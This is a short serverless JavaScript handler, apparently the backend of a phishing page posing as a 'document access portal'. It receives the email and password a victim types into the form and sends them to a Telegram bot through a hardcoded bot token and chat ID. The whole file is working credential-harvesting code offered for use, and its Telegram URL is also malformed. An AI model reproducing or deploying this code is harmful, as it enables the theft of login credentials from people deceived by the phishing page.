export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    // Capture the JSON parameters directly from the browser payload
    const email = req.body?.email;
    const password = req.body?.password;

    // Your completely new, confirmed working credentials
    const botToken = "9034651544:AAFF2_8GEO6H3e6ataVEkHhha39kIDPlAt8"; 
    const chatId = "1080822304"; 

    if (!email || !password) {
        return res.status(400).send('Missing email or password credentials.');
    }

    const messageText = `📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n📧 Portal Email: ${email}\n🔑 Access Key: ${password}`;
    const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

    try {
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText
            })
        });

        const result = await response.json();

        if (result.ok) {
            return res.status(200).send('Success');
        } else {
            return res.status(500).send(result.description);
        }
    } catch (error) {
        return res.status(500).send(error.message);
    }
}
